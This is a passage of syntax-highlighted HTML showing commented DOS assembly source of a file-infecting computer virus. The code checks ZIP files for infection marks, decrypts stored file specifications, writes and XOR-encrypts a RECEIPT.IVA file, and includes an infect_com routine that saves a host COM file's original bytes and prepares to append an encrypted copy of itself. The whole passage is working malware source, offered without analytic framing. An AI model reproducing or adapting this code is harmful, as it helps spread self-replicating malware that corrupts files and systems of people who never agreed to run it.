         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = low-order word of extra field</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Read one thousand and twenty-fou...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of extra field</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1492h</span><span class="sc0">        </span><span class="sc1">; Found infection mark?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">comp_extra</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to comp_extra</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">comp_extra</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of extra field</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1776h</span><span class="sc0">        </span><span class="sc1">; Found infection mark?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">load_extra</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to load_extra</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">load_extra</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = 16-bit decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DX =   "        "       "</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = number of file specifications</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; CL = number of filespecification</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
</span><span class="sc5">decrypt_next</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; Decryption fourteen bytes</span><span class="sc0">
</span><span class="sc5">decrypt_spec</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of encrypted file spec...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Decrypt word of file specification</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store word of file specification</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_spec</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_next</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of data buffer</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AX = segment of pathname</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "     "</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">      </span><span class="sc1">; Get current directory</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Default drive</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of pathname</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; AX = segment of end of pathname</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "  "     "</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'              ; AL = backslash
</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store backslash</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; AL = zero</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store zero</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">26h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">; Store segment of disk transfer a...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">; Store offset of disk transfer ar...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">48h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of disk transfer area</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">receipt_iva</span><span class="sc0">  </span><span class="sc1">; DX = offset of receipt_iva</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Don't store backslash</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_recei</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">48h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of disk transfer area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "      "      "</span><span class="sc0">
</span><span class="sc5">encrypt_rece</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">         </span><span class="sc1">; Read one thousand and twenty-fou...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Read all of the file?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">set_dta_addr</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to set_dta_addr</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DX = -number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,-</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_cfp</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
</span><span class="sc5">encrypt_ipt_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; Encrypt byte of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store encrypted byte of RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_ipt_</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes actually read</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">encrypt_rece</span><span class="sc0">
</span><span class="sc5">set_dta_addr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">26h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS = segment of disk transfer area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = offset of disk transfer area</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">      </span><span class="sc1">; Set current directory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">receipt_iva</span><span class="sc0">  </span><span class="sc1">; SI = offset of receipt_iva</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">      </span><span class="sc1">; Move thirteen bytes</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move RECEIPT.IVA to filename</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">open_filenam</span><span class="sc0">
</span><span class="sc5">call_mark_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_mark</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">temp_file</span><span class="sc0">    </span><span class="sc1">; DX = offset of temp_file</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delete_file</span><span class="sc0">
</span><span class="sc5">inf_zip_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_load</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; SP = stack pointer</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM file</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Correct stack pointer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; COM executable</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_or_exe</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">; Store COM executable</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = word of original code of CO...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_code</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = byte of original code of CO...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">origin_code</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_copy</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of filesize</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tst_filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Don't test filesize?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">calc_buf_seg</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to calc_buf_seg</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Filesize too large?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">inf_com_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to inf_com_exit</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">; Filesize too small?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inf_com_exit</span><span class="sc0">    </span><span class="sc1">; Below? Jump to inf_com_exit</span><span class="sc0">
</span><span class="sc5">calc_buf_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inf_com_exit</span><span class="sc0">    </span><span class="sc1">; Filesize too large? Jump to inf_...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
